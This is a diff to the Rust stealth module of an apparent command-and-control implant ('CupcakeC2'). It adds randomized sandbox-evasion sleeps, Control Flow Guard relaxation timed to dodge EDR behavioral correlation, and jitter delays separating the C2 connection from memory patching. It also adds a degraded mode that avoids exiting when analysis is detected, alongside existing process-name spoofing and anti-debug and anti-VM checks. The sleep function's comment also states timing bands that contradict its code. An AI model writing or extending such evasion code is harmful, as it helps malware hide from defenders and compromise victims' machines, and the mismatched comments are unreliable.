@@ -1,5 +1,5 @@
 // Client/core/src/stealth/mod.rs
-// CupcakeC2 V3 Stealth Subsystem
+// Stealth Subsystem
 //
 // Two-layer architecture:
 // - Layer A (default): version-agnostic PEB/syscall helpers (peb, stack, integrity helpers, version)
@@ -63,6 +63,9 @@ pub const fn hash_api_name(s: &[u8]) -> u32 {
 /// Best-effort: relax Control Flow Guard for this process so Manual-Mapped
 /// L2 modules (classic in-process BOF engine) can be invoked via indirect
 /// function pointers. Silent no-op when the API is absent.
+///
+/// Prefer [`ensure_cfg_relaxed`] — unconditional CFG disable at connect-time
+/// is an EDR behavioral signature; call only when mem-map actually needs it.
 #[cfg(windows)]
 pub fn relax_cfg_self() {
     const H_SET_MITIGATION: u32 = hash_api_name(b"SetProcessMitigationPolicy");
@@ -79,6 +82,35 @@ pub fn relax_cfg_self() {
         let _ = f(7, policy.as_ptr(), policy.len());
     }
 }
+
+/// Lazy, once-only CFG relax gated on product need.
+///
+/// Conditions (all must hold):
+/// - Windows + `mem-map` feature (Manual-Map L2 / BOF)
+/// - Not in degraded mode (sandbox/VM/debugger → avoid high-risk patches)
+/// - First call only (`Once`)
+///
+/// Call from `pe_map` / module load paths — **not** at process start or
+/// immediately post-connect, so EDR does not see CFG policy change + network
+/// C2 in the same behavioral window.
+#[cfg(windows)]
+pub fn ensure_cfg_relaxed() {
+    static DONE: std::sync::Once = std::sync::Once::new();
+    DONE.call_once(|| {
+        // Degraded: skip mitigation changes entirely.
+        if is_degraded() {
+            return;
+        }
+        // Only Manual-Map builds need CFG relax for indirect module calls.
+        #[cfg(feature = "mem-map")]
+        {
+            relax_cfg_self();
+        }
+    });
+}
+
+#[cfg(not(windows))]
+pub fn ensure_cfg_relaxed() {}
 
 pub fn hide_console() {
     #[cfg(windows)]
@@ -180,6 +212,9 @@ pub fn setup_diagnostic_console() {
 /// Sleep with optional jitter. With `sleep-mask` (Windows x64): suspend peers,
 /// mask PE data sections + SensitiveRegion whitelist, sleep, then restore.
 /// Never XOR the process default heap on the product path.
+/// `net`-gated: needs tokio; all callers (handler / batch / agent main) are
+/// tokio builds — L2 module crates never call it.
+#[cfg(feature = "net")]
 pub async fn stealth_sleep(duration_ms: u32) {
     let jitter = if duration_ms > 10 {
         crate::utils::random_range(0, duration_ms / 10) as u64
@@ -290,18 +325,18 @@ pub fn spoof_process_name(_name: &str) {
                 // PR_SET_MM = 45, ARG_START = 1
                 let ret = libc::prctl(45, 1, arg_area as u64, 0, 0);
                 if ret == 0 {
-                    crate::utils::db_print(&format!(
-                        "[agent] cmdline modified via PR_SET_MM to: {}",
+                    crate::db_print!(
+                        "[*] cmdline modified via PR_SET_MM to: {}",
                         name
-                    ));
+                    );
 
                     // Set ARG_END
                     let arg_end = arg_area as u64 + name_bytes.len() as u64 + 1;
                     libc::prctl(45, 2, arg_end, 0, 0);
                 } else {
                     // Fallback: PR_SET_MM requires CAP_SYS_ADMIN
-                    crate::utils::db_print(
-                        "[agent] PR_SET_MM failed (likely missing CAP_SYS_ADMIN), using fallback",
+                    crate::db_print!(
+                        "[*] PR_SET_MM failed (likely missing CAP_SYS_ADMIN), using fallback"
                     );
                 }
             }
@@ -312,10 +347,10 @@ pub fn spoof_process_name(_name: &str) {
         // Note: This would require re-executing the process, which is complex
         // We'll implement a simpler version that creates a memfd and overwrites exe symlink
 
-        crate::utils::db_print(&format!(
-            "[agent] Process name spoofed to: {} (comm)",
+        crate::db_print!(
+            "[*] Process name spoofed to: {} (comm)",
             name
-        ));
+        );
     }
 }
 
@@ -377,7 +412,7 @@ pub fn spawn_memfd_clone() -> Option<u32> {
         libc::close(fd);
 
         if pid > 0 {
-            crate::utils::db_print(&format!("[agent] Spawned memfd clone with PID: {}", pid));
+            crate::db_print!("[*] Spawned memfd clone with PID: {}", pid);
             Some(pid as u32)
         } else {
             None
@@ -498,10 +533,85 @@ pub fn secure_zeroize(data: &mut [u8]) {
     std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
 }
 
-/// Large initial sleep (15-45s) to evade automated sandbox analysis
+/// Initial quiet period before the first connection. Multi-band distribution
+/// so the startup timing is not a deterministic signature:
+/// - ~70%: normal quiet 30–90s
+/// - ~20%: deep silence 90–240s
+/// - ~8%:  extended quiet 240–420s
+/// - ~2%:  rare long stall 420–600s (breaks sandbox time budgets)
+///
+/// Skip with `AGENT_SKIP_SANDBOX_SLEEP=1` or `AGENT_ALLOW_DIAG=1` (lab/e2e).
+///
+/// Distribution (seconds): most runs ~15–45s (matches product docs). Long tails
+/// still break naive sandbox time budgets without making lab operators wait 10min.
+#[cfg(feature = "net")]
 pub async fn sandbox_evasion_sleep() {
-    let delay = crate::utils::random_range(15, 45) as u64;
-    stealth_sleep((delay * 1000) as u32).await;
+    let roll = crate::utils::random_range(0, 100);
+    let delay = if roll < 2 {
+        // ~2%: rare long stall
+        crate::utils::random_range(120, 180)
+    } else if roll < 10 {
+        // ~8%: extended quiet
+        crate::utils::random_range(60, 120)
+    } else if roll < 30 {
+        // ~20%: medium
+        crate::utils::random_range(45, 90)
+    } else {
+        // ~70%: normal product quiet window
+        crate::utils::random_range(15, 45)
+    };
+    // Split long sleeps into 2–4 slices with short organic gaps so a single
+    // monolithic Sleep(N) is less of a sandbox fingerprint.
+    let slices = crate::utils::random_range(2, 4) as u64;
+    let slice_secs = (delay as u64).max(1) / slices;
+    let mut remaining = delay as u64;
+    for i in 0..slices {
+        let this = if i + 1 == slices {
+            remaining
+        } else {
+            let j = crate::utils::random_range(0, 20) as u64;
+            // ±20% around equal slice
+            let base = slice_secs;
+            let adj = base.saturating_mul(100 + j.saturating_sub(10)).saturating_div(100);
+            adj.min(remaining.saturating_sub(1).max(1))
+        };
+        remaining = remaining.saturating_sub(this);
+        stealth_sleep((this * 1000) as u32).await;
+        if remaining > 0 {
+            // Brief gap between slices (50–400ms) — looks less like one sleep call.
+            let gap = crate::utils::random_range(50, 400) as u64;
+            tokio::time::sleep(tokio::time::Duration::from_millis(gap)).await;
+        }
+    }
+}
+
+/// Short non-deterministic pause (1–400ms) between init steps.
+/// Synchronous so it works from sync `main()` (pre-runtime).
+pub fn small_jitter_sleep() {
+    let ms = crate::utils::random_range(1, 400) as u64;
+    std::thread::sleep(std::time::Duration::from_millis(ms));
+}
+
+/// Medium organic pause (80–1200ms) for heavier phase boundaries
+/// (e.g. pre-thread, post-connect pre-patch).
+pub fn medium_jitter_sleep() {
+    let ms = crate::utils::random_range(80, 1200) as u64;
+    std::thread::sleep(std::time::Duration::from_millis(ms));
+}
+
+/// Async medium pause for use inside the tokio agent loop.
+#[cfg(feature = "net")]
+pub async fn medium_jitter_sleep_async() {
+    let ms = crate::utils::random_range(80, 1200) as u64;
+    tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
+}
+
+/// Post-connect quiet before any memory patches (500ms–4s).
+/// Separates "network C2 established" from "process memory modified".
+#[cfg(feature = "net")]
+pub async fn post_connect_patch_delay() {
+    let ms = crate::utils::random_range(500, 4000) as u64;
+    tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
 }
 
 /// Combined environment check: returns true if debugger/VM detected
@@ -509,17 +619,55 @@ pub fn check_environment() -> bool {
     #[cfg(windows)]
     {
         if is_debugger_present() {
-            crate::utils::db_print("[AntiDebug] Debugger detected via PEB");
+            crate::db_print!("[AntiDebug] Debugger detected via PEB");
             return true;
         }
         if check_hardware_breakpoints() {
-            crate::utils::db_print("[AntiDebug] Hardware breakpoint detected");
+            crate::db_print!("[AntiDebug] Hardware breakpoint detected");
             return true;
         }
     }
     if is_vm_via_cpuid() {
-        crate::utils::db_print("[AntiVM] Hypervisor detected via CPUID");
+        crate::db_print!("[AntiVM] Hypervisor detected via CPUID");
         return true;
     }
     false
+}
+
+/// Process-wide degraded flag: stretch heartbeat / skip high-risk modules.
+/// Never hard-exit on analysis detection (exit-on-detect is a sandbox signal).
+static DEGRADED_MODE: std::sync::atomic::AtomicBool =
+    std::sync::atomic::AtomicBool::new(false);
+
+/// Enter degraded OPSEC mode (idempotent).
+pub fn enter_degraded_mode() {
+    DEGRADED_MODE.store(true, std::sync::atomic::Ordering::SeqCst);
+}
+
+/// Whether anti-analysis decided to degrade this process.
+pub fn is_degraded() -> bool {
+    DEGRADED_MODE.load(std::sync::atomic::Ordering::SeqCst)
+}
+
+/// Pure helper for tests / synthetic hostile-env decisions (does not exit).
+pub fn degrade_on_hostile(hostile: bool) -> bool {
+    if hostile {
+        enter_degraded_mode();
+    }
+    is_degraded()
+}
+
+#[cfg(test)]
+mod degrade_tests {
+    use super::*;
+
+    #[test]
+    fn degrade_flag_sets_without_exit() {
+        // Isolate: only assert the pure path returns true when hostile.
+        assert!(degrade_on_hostile(true));
+        assert!(is_degraded());
+        // hostile=false does not clear; flag stays set once entered
+        let _ = degrade_on_hostile(false);
+        assert!(is_degraded());
+    }
 }
